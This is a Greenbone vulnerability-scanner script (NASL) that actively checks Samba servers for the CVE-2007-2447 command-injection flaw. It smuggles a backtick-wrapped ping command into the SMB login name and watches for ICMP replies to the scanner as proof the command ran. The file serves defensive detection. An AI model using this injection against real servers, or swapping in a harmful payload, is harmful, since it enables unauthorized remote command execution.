# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:samba:samba";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108011");
  script_version("2025-03-18T05:38:50+0000");
  script_cve_id("CVE-2007-2447");
  script_tag(name:"cvss_base", value:"6.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-18 05:38:50 +0000 (Tue, 18 Mar 2025)");
  script_tag(name:"creation_date", value:"2016-10-31 11:47:00 +0200 (Mon, 31 Oct 2016)");
  script_name("Samba 3.0.0 <= 3.0.25rc3 MS-RPC Remote Shell Command Execution Vulnerability - Active Check");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_dependencies("smb_nativelanman.nasl");
  script_require_ports(139, 445);
  script_mandatory_keys("samba/smb/detected");

  script_xref(name:"URL", value:"https://www.samba.org/samba/security/CVE-2007-2447.html");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121173708/http://www.securityfocus.com/bid/23972");

  script_tag(name:"summary", value:"Samba is prone to a vulnerability that allows attackers to
  execute arbitrary shell commands because the software fails to sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted SMB request and checks if the target is
  connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary shell
  commands on an affected system with the privileges of the application.");

  script_tag(name:"solution", value:"Updates are available. Please see the referenced vendor
  advisory.");

  script_tag(name:"affected", value:"Samba versions 3.0.0 through 3.0.25rc3.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("smb_nt.inc");
include("host_details.inc");
include("misc_func.inc");
include("dump.inc");
include("list_array_func.inc");
include("pcap_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );

name = kb_smb_name();
if( ! name )
  name = "*SMBSERVER";

foreach connect_back_target( make_list( ownip, ownhostname ) ) {

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
  # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
  # the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  if( ! soc = open_sock_tcp( port ) )
    continue;

  if( ! r = smb_session_request( soc:soc, remote:name ) )
    continue;

  vtstrings = get_vt_strings();
  check = vtstrings["ping_string"];
  pattern = hexstr( check );

  # Vulnerable samba versions are executing the command passed via login
  # smb_session_setup() takes a good amount of time so using 50 ping requests here
  login = "`ping -p " + pattern + " -c50 " + connect_back_target + "`";

  # nb: With NTLMSSP_AUTH the login name will be converted to "toupper()" in smb_nt.inc
  # Because of this the ping command will fail so using cleartext login for now
  #prot = smb_neg_prot( soc:soc );
  #if( ! prot ) exit( 0 );
  #smb_session_setup( soc:soc, login:login, password:"", domain:"", prot:prot );
  smb_session_setup_cleartext( soc:soc, login:login, password:"", domain:"" );

  max = 50; # Amount of ping requests used in the login above

  while( res = send_capture( socket:soc, data:"", pcap_filter:filter ) ) {

    count++;

    type = get_icmp_element( icmp:res, element:"icmp_type" );
    if( ! type || type != 8 )
      continue;

    if( ! data = get_icmp_element( icmp:res, element:"data" ) )
      continue;

    if( check >< data ) {
      close( soc );
      report = 'By sending a special crafted SMB request it was possible to execute `' + login  + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
      security_message( port:port, data:report );
      exit( 0 );
    }

    if( count > max )
      break;
  }

  close( soc );
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
